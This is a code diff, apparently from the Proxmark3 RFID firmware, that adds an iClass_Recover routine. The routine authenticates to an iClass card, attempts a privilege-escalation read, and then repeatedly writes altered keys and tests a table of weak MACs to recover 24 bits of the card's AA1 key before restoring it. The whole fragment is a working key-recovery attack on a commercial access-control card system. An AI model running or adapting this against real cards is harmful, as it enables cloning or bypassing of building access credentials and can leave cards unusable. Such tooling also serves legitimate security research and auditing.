+void generate_single_key_block_inverted(const uint8_t *startingKey, uint32_t index, uint8_t *keyBlock) {
+    uint32_t carry = index;
+    memcpy(keyBlock, startingKey, PICOPASS_BLOCK_SIZE);
+
+    for (int j = PICOPASS_BLOCK_SIZE - 1; j >= 0; j--) {
+        uint8_t increment_value = carry & 0x07;  // Use only the last 3 bits of carry
+        keyBlock[j] = increment_value;  // Set the last 3 bits, assuming first 5 bits are always 0
+
+        carry >>= 3;  // Shift right by 3 bits for the next byte
+        if (carry == 0) {
+            // If no more carry, break early to avoid unnecessary loops
+            break;
+        }
+    }
+}
+
+void iClass_Recover(iclass_recover_req_t *msg) {
+
+    bool shallow_mod = false;
+
+    LED_A_ON();
+    Dbprintf(_RED_("Interrupting this process will render the card unusable!"));
+
+    Iso15693InitReader();
+    //Authenticate with AA2 with the standard key to get the AA2 mac
+    //Step0 Card Select Routine
+
+    uint32_t eof_time = 0;
+    picopass_hdr_t hdr = {0};
+
+    bool res = select_iclass_tag(&hdr, msg->req2.use_credit_key, &eof_time, shallow_mod);
+    //bool res = select_iclass_tag(&hdr, true, &eof_time, shallow_mod);
+    if (res == false) {
+        Dbprintf(_RED_("Unable to select card! Stopping."));
+        goto out;
+    } else {
+        DbpString(_GREEN_("Card selected successfully!"));
+    }
+
+    //Step1 Authenticate with AA2 using K2
+
+    uint8_t mac2[4] = {0};
+    uint32_t start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+    res = authenticate_iclass_tag(&msg->req2, &hdr, &start_time, &eof_time, mac2);
+    if (res == false) {
+        Dbprintf(_RED_("Unable to authenticate with AA2 using K2! Stopping."));
+        goto out;
+    } else {
+        DbpString(_GREEN_("AA2 authentication with K2 successful!"));
+    }
+
+    uint8_t div_key2[8] = {0};
+    memcpy(div_key2, hdr.key_c, 8);
+
+    //cycle reader to reset cypher state and be able to authenticate with k1 trace
+    switch_off();
+    Iso15693InitReader();
+    DbpString(_YELLOW_("Cycled Reader..."));
+
+    //Step0 Card Select Routine
+
+    eof_time = 0;
+    //hdr = {0};
+    res = select_iclass_tag(&hdr, false, &eof_time, shallow_mod);
+    if (res == false) {
+        Dbprintf(_RED_("Unable to select card after reader cycle! Stopping."));
+        goto out;
+    } else {
+        DbpString(_GREEN_("Card selected successfully!"));
+    }
+
+    //Step1 Authenticate with AA1 using trace
+
+    uint8_t mac1[4] = {0};
+    start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+    res = authenticate_iclass_tag(&msg->req, &hdr, &start_time, &eof_time, mac1);
+    if (res == false) {
+        Dbprintf(_RED_("Unable to authenticate on AA1 using macs! Stopping."));
+        goto out;
+    } else {
+        DbpString(_GREEN_("Authenticated with AA1 with macs!"));
+    }
+
+    //Step2 Privilege Escalation: attempt to read AA2 with credentials for AA1
+    uint8_t blockno = 24;
+    uint8_t cmd_read[] = {ICLASS_CMD_READ_OR_IDENTIFY, blockno, 0x00, 0x00};
+    AddCrc(cmd_read + 1, 1);
+    uint8_t resp[10];
+    DbpString(_YELLOW_("Attempting privilege escalation..."));
+    res = iclass_send_cmd_with_retries(cmd_read, sizeof(cmd_read), resp, sizeof(resp), 10, 3, &start_time, ICLASS_READER_TIMEOUT_OTHERS, &eof_time, shallow_mod);
+
+    static uint8_t iclass_mac_table[8][8] = {    //Reference weak macs table
+        { 0x00, 0x00, 0x00, 0x00, 0xBF, 0x5D, 0x67, 0x7F }, //Expected mac when last 3 bits of each byte are: 000
+        { 0x00, 0x00, 0x00, 0x00, 0x10, 0xED, 0x6F, 0x11 }, //Expected mac when last 3 bits of each byte are: 001
+        { 0x00, 0x00, 0x00, 0x00, 0x53, 0x35, 0x42, 0x0F }, //Expected mac when last 3 bits of each byte are: 010
+        { 0x00, 0x00, 0x00, 0x00, 0xAB, 0x47, 0x4D, 0xA0 }, //Expected mac when last 3 bits of each byte are: 011
+        { 0x00, 0x00, 0x00, 0x00, 0xF6, 0xCF, 0x43, 0x36 }, //Expected mac when last 3 bits of each byte are: 100
+        { 0x00, 0x00, 0x00, 0x00, 0x59, 0x7F, 0x4B, 0x58 }, //Expected mac when last 3 bits of each byte are: 101
+        { 0x00, 0x00, 0x00, 0x00, 0x1A, 0xA7, 0x66, 0x46 }, //Expected mac when last 3 bits of each byte are: 110
+        { 0x00, 0x00, 0x00, 0x00, 0xE2, 0xD5, 0x69, 0xE9 }  //Expected mac when last 3 bits of each byte are: 111
+    };
+    //Viewing the weak macs table card 24 bits (3x8) in the form of a 24 bit decimal number
+    static uint32_t iclass_mac_table_bit_values[8] = {0, 2396745, 4793490, 7190235, 9586980, 11983725, 14380470, 16777215};
+
+    /*  iclass_mac_table is a series of weak macs, those weak macs correspond to the different combinations of the last 3 bits of each key byte.
+    If we concatenate the last three bits of each key byte, we have a 24 bits long binary string.
+    If we convert that string to decimal we obtain the decimal numbers in iclass_mac_table_bit_values
+    Xorring the index of iterations against those decimal numbers allows us to retrieve the what was the corresponding sequence of bits of the original key in decimal format. */
+
+    uint8_t zero_key[PICOPASS_BLOCK_SIZE] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+    uint32_t index = 1;
+    int bits_found = -1;
+
+    //START LOOP
+    while (bits_found == -1) {
+
+        //Step3 Calculate New Key
+        uint8_t genkeyblock[PICOPASS_BLOCK_SIZE];
+        uint8_t genkeyblock_old[PICOPASS_BLOCK_SIZE];
+        uint8_t xorkeyblock[PICOPASS_BLOCK_SIZE];
+        generate_single_key_block_inverted(zero_key, index, genkeyblock);
+
+        //NOTE BEFORE UPDATING THE KEY WE NEED TO KEEP IN MIND KEYS ARE XORRED
+        //xor the new key against the previously generated key so that we only update the difference
+        if (index != 0) {
+            generate_single_key_block_inverted(zero_key, index - 1, genkeyblock_old);
+            for (int i = 0; i < 8 ; i++) {
+                xorkeyblock[i] = genkeyblock[i] ^ genkeyblock_old[i];
+            }
+        } else {
+            memcpy(xorkeyblock, genkeyblock, PICOPASS_BLOCK_SIZE);
+        }
+
+        //Step4 Calculate New Mac
+
+        bool use_mac = true;
+        uint8_t wb[9] = {0};
+        blockno = 3;
+        wb[0] = blockno;
+        memcpy(wb + 1, xorkeyblock, 8);
+        doMAC_N(wb, sizeof(wb), div_key2, mac2);
+
+        //Step5 Perform Write
+
+        DbpString("Generated XOR Key: ");
+        Dbhexdump(8, xorkeyblock, false);
+
+        if (iclass_writeblock_ext(blockno, xorkeyblock, mac2, use_mac, shallow_mod)) {
+            Dbprintf("Write block [%3d/0x%02X] " _GREEN_("successful"), blockno, blockno);
+        } else {
+            Dbprintf("Write block [%3d/0x%02X] " _RED_("failed"), blockno, blockno);
+            if (index > 1) {
+                Dbprintf(_RED_("Card is likely to be unusable!"));
+            }
+            goto out;
+        }
+        //Step6 Perform 8 authentication attempts
+
+        for (int i = 0; i < 8 ; ++i) {
+            //need to craft the authentication payload accordingly
+            memcpy(msg->req.key, iclass_mac_table[i], 8);
+            res = authenticate_iclass_tag(&msg->req, &hdr, &start_time, &eof_time, mac1); //mac1 here shouldn't matter
+            if (res == true) {
+                bits_found = iclass_mac_table_bit_values[i] ^ index;
+                Dbprintf("Found Card Bits Index: " _GREEN_("[%3d]"), index);
+                Dbprintf("Mac Table Bit Values: " _GREEN_("[%3d]"), iclass_mac_table_bit_values[i]);
+                Dbprintf("Decimal Value of Partial Key: " _GREEN_("[%3d]"), bits_found);
+                goto restore;
+            }
+        }
+        index++;
+    }//end while
+
+
+restore:
+    ;//empty statement for compilation
+    uint8_t partialkey[PICOPASS_BLOCK_SIZE];
+    convertToHexArray(bits_found, partialkey);
+
+    uint8_t resetkey[PICOPASS_BLOCK_SIZE];
+    convertToHexArray(index, resetkey);
+
+    //Calculate reset Mac
+
+    bool use_mac = true;
+    uint8_t wb[9] = {0};
+    blockno = 3;
+    wb[0] = blockno;
+    memcpy(wb + 1, resetkey, 8);
+    doMAC_N(wb, sizeof(wb), div_key2, mac2);
+
+    //Write back the card to the original key
+    DbpString(_YELLOW_("Restoring Card to the original key using Reset Key: "));
+    Dbhexdump(8, resetkey, false);
+    if (iclass_writeblock_ext(blockno, resetkey, mac2, use_mac, shallow_mod)) {
+        Dbprintf("Restore of Original Key "_GREEN_("successful. Card is usable again."));
+    } else {
+        Dbprintf("Restore of Original Key " _RED_("failed. Card is likely unusable."));
+    }
+    //Print the 24 bits found from k1
+    DbpString(_YELLOW_("Raw Key Partial Bytes: "));
+    Dbhexdump(8, partialkey, false);
+    switch_off();
+    reply_ng(CMD_HF_ICLASS_RECOVER, PM3_SUCCESS, NULL, 0);
+
+
+out:
+
+    switch_off();
+    reply_ng(CMD_HF_ICLASS_RECOVER, PM3_ESOFT, NULL, 0);
+
 }
